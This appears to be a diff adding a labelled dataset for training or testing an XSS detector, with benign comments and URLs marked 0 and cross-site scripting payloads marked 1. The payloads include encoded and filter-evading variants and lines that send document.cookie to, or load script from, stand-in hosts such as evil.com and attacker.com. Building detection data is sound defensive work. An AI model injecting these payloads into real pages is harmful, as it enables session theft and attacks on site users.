@@ -1,0 +1,112 @@
+{"text": "Hello, this is a legitimate comment.", "label": 0}
+{"text": "Very helpful cybersecurity tutorial, thanks for sharing!", "label": 0}
+{"text": "I enjoyed reading this article on secure software development.", "label": 0}
+{"text": "Great explanation of web application architectures and protocols.", "label": 0}
+{"text": "Looking forward to the next update on database indexing.", "label": 0}
+{"text": "Could you provide more details about session management?", "label": 0}
+{"text": "The demonstration code was easy to understand and test locally.", "label": 0}
+{"text": "Defensive programming is essential for modern web services.", "label": 0}
+{"text": "Thanks for the thorough documentation and clean layout.", "label": 0}
+{"text": "This tutorial helped clarify client-server communication.", "label": 0}
+{"text": "Python flask web architecture", "label": 0}
+{"text": "SQLite foreign key constraints", "label": 0}
+{"text": "Computer networking TCP/IP model", "label": 0}
+{"text": "Defensive input validation patterns", "label": 0}
+{"text": "HTTP response status codes and headers", "label": 0}
+{"text": "How to configure Content-Security-Policy", "label": 0}
+{"text": "Cross-site scripting mitigation best practices", "label": 0}
+{"text": "Unit testing with pytest and coverage tools", "label": 0}
+{"text": "Application factory pattern in Python Flask", "label": 0}
+{"text": "Structured logging with timestamps and request IDs", "label": 0}
+{"text": "Security researcher and software developer.", "label": 0}
+{"text": "Computer science undergraduate interested in application security.", "label": 0}
+{"text": "Full-stack engineer focusing on clean architecture.", "label": 0}
+{"text": "Python enthusiast and open-source contributor.", "label": 0}
+{"text": "Studying network protocols, cryptography, and defensive design.", "label": 0}
+{"text": "Security analyst researching web vulnerability patterns.", "label": 0}
+{"text": "Developer with experience in relational databases and REST APIs.", "label": 0}
+{"text": "Learning web standards, semantic HTML, and modern CSS.", "label": 0}
+{"text": "Price comparison: $100 < $200 and quality > average!", "label": 0}
+{"text": "Math formula: x < 10 and y > 20 for positive integers.", "label": 0}
+{"text": "Check out John's report: 'Security Analysis 2026'.", "label": 0}
+{"text": "Expressions: 5 < 15 & 30 > 25.", "label": 0}
+{"text": "Variables: a < b and b < c implies a < c.", "label": 0}
+{"text": "Result: threshold > 0.75 and error_rate < 0.05.", "label": 0}
+{"text": "Comparing versions: v1.2 < v2.0 & build > 400.", "label": 0}
+{"text": "In JavaScript, functions like alert() and eval() require defensive review.", "label": 0}
+{"text": "HTML tags such as <script> are discussed in this security document.", "label": 0}
+{"text": "Remember that document.cookie is a browser API used for session storage.", "label": 0}
+{"text": "SVG stands for Scalable Vector Graphics and uses XML markup.", "label": 0}
+{"text": "Inline event handlers like onclick and onload can bind behavior to elements.", "label": 0}
+{"text": "JavaScript uses prompt() and confirm() for simple modal dialogs.", "label": 0}
+{"text": "Web browsers support URI schemes such as https, http, and mailto.", "label": 0}
+{"text": "In web security, window.location handles browser redirects.", "label": 0}
+{"text": "HTML elements like <iframe> can embed sub-documents within a webpage.", "label": 0}
+{"text": "The <body> tag contains the rendered content of an HTML document.", "label": 0}
+{"text": "Educational note: javascript: pseudo-protocols can be dangerous if unvalidated.", "label": 0}
+{"text": "Discussing DOM sinks: document.write is considered legacy practice.", "label": 0}
+{"text": "Code review tip: verify attribute delimiter handling for quotes.", "label": 0}
+{"text": "How to safely parse JSON without using eval() in Python or JavaScript.", "label": 0}
+{"text": "Understanding the difference between <script> tags and external bundles.", "label": 0}
+{"text": "https://example.com/docs/index.html", "label": 0}
+{"text": "http://security-research.org/articles?id=42&sort=asc", "label": 0}
+{"text": "https://github.com/project/repository", "label": 0}
+{"text": "https://developer.mozilla.org/en-US/docs/Web/JavaScript", "label": 0}
+{"text": "http://localhost:5000/search?query=flask", "label": 0}
+{"text": "https://en.wikipedia.org/wiki/Cross-site_scripting", "label": 0}
+{"text": "https://docs.python.org/3/library/sqlite3.html", "label": 0}
+{"text": "<script>alert(1)</script>", "label": 1}
+{"text": "<script src='http://attacker.com/xss.js'></script>", "label": 1}
+{"text": "<sCrIpt>alert('xss')</sCrIpT>", "label": 1}
+{"text": "<script /x >alert(1)</script>", "label": 1}
+{"text": "<script>eval(document.cookie)</script>", "label": 1}
+{"text": "<script>prompt(1)</script>", "label": 1}
+{"text": "<script>confirm('hacked')</script>", "label": 1}
+{"text": "<script>window.location='http://evil.com?c='+document.cookie</script>", "label": 1}
+{"text": "<script>document.write('<img src=x onerror=alert(1)>')</script>", "label": 1}
+{"text": "</script><script>alert(1)</script>", "label": 1}
+{"text": "<img src=x onerror=alert(1)>", "label": 1}
+{"text": "<img src=invalid onerror='alert(document.domain)'>", "label": 1}
+{"text": "<body onload=alert(1)>", "label": 1}
+{"text": "<body onload='calc()'>", "label": 1}
+{"text": "<input onfocus=alert(1) autofocus>", "label": 1}
+{"text": "<svg onload=alert(1)>", "label": 1}
+{"text": "<svg/onload=alert('svg')>", "label": 1}
+{"text": "<button onclick=alert(1)>Click</button>", "label": 1}
+{"text": "<a href='#' onmouseover=alert(1)>Link</a>", "label": 1}
+{"text": "<select onchange=alert(1)><option>1</option></select>", "label": 1}
+{"text": "<video src=x onerror=alert(1)></video>", "label": 1}
+{"text": "<audio src=x onerror=alert(1)></audio>", "label": 1}
+{"text": "<details open ontoggle=alert(1)>", "label": 1}
+{"text": "javascript:alert(1)", "label": 1}
+{"text": "JAVASCRIPT:alert(document.cookie)", "label": 1}
+{"text": "javascript:prompt(1)", "label": 1}
+{"text": "javascript:confirm(1)", "label": 1}
+{"text": "vbscript:msgbox(1)", "label": 1}
+{"text": "data:text/html,<script>alert(1)</script>", "label": 1}
+{"text": "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==", "label": 1}
+{"text": "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>", "label": 1}
+{"text": "<svg><animate onbegin=alert(1)>", "label": 1}
+{"text": "<svg><set attributeName=onload onbegin=alert(1)>", "label": 1}
+{"text": "<iframe src='javascript:alert(1)'></iframe>", "label": 1}
+{"text": "<iframe src='http://evil.com/xss'></iframe>", "label": 1}
+{"text": "<object data='javascript:alert(1)'></object>", "label": 1}
+{"text": "<embed src='javascript:alert(1)'>", "label": 1}
+{"text": "<embed src='payload.swf'>", "label": 1}
+{"text": "\"><script>alert(1)</script>", "label": 1}
+{"text": "';alert(1)//", "label": 1}
+{"text": "\"><img src=x onerror=alert(1)>", "label": 1}
+{"text": "'><svg onload=alert(1)>", "label": 1}
+{"text": "\" onfocus=\"alert(1)\" autofocus=\"", "label": 1}
+{"text": "\" onclick=\"alert(document.cookie)\"", "label": 1}
+{"text": "\" onmouseover=\"alert(1)\" style=\"display:block;width:1000px;height:1000px;", "label": 1}
+{"text": "' onfocus=alert(1) autofocus '", "label": 1}
+{"text": "\"><input onfocus=alert(1) autofocus>", "label": 1}
+{"text": "%3Cscript%3Ealert(1)%3C/script%3E", "label": 1}
+{"text": "%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E", "label": 1}
+{"text": "&lt;script&gt;alert(1)&lt;/script&gt;", "label": 1}
+{"text": "&lt;img src=x onerror=alert(1)&gt;", "label": 1}
+{"text": "%253Cscript%253Ealert(1)%253C/script%253E", "label": 1}
+{"text": "<a href=\"jav&#x09;ascript:alert(1)\">click</a>", "label": 1}
+{"text": "<img src=\"x\" onerror=\"&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000049&#0000041\">", "label": 1}
+{"text": "<svg/onload=&#97;&#108;&#101;&#114;&#116;(1)>", "label": 1}
